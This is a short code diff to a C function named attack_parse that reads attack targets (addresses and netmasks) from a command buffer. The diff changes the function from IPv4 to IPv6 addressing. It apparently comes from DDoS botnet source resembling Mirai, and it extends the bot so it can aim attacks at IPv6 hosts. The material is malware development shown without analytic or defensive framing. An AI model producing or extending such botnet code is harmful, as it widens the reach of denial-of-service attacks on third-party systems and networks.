@@ -94,18 +94,18 @@ void attack_parse(char *buf, int len)
         goto cleanup;
 
     // Read in all targs
-    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
+    if (len < ((sizeof (struct in6_addr) + sizeof (uint8_t)) * targs_len))
         goto cleanup;
     targs = calloc(targs_len, sizeof (struct attack_target));
     for (i = 0; i < targs_len; i++)
     {
-        targs[i].addr = *((ipv4_t *)buf);
-        buf += sizeof (ipv4_t);
+        targs[i].addr = *((struct in6_addr *)buf);
+        buf += sizeof (struct in6_addr);
         targs[i].netmask = (uint8_t)*buf++;
-        len -= (sizeof (ipv4_t) + sizeof (uint8_t));
+        len -= (sizeof (struct in6_addr) + sizeof (uint8_t));
 
-        targs[i].sock_addr.sin_family = AF_INET;
-        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
+        targs[i].sock_addr.sin6_family = AF_INET6;
+        targs[i].sock_addr.sin6_addr = targs[i].addr;
     }
 
     // Read in flag count uint8_t
